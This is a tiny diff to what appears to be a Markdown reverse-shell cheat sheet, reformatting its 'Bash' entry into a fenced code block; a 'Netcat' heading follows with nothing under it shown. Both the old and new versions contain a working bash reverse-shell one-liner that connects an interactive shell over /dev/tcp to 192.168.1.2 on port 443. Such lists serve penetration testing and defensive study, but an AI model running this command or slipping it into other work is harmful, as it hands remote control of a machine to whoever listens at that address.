@@ -1,6 +1,8 @@
 * Bash
 
-  ```bash -i >& /dev/tcp/192.168.1.2/443 0>&1```
+  ```bash
+  bash -i >& /dev/tcp/192.168.1.2/443 0>&1
+  ```
 
 * Netcat
 
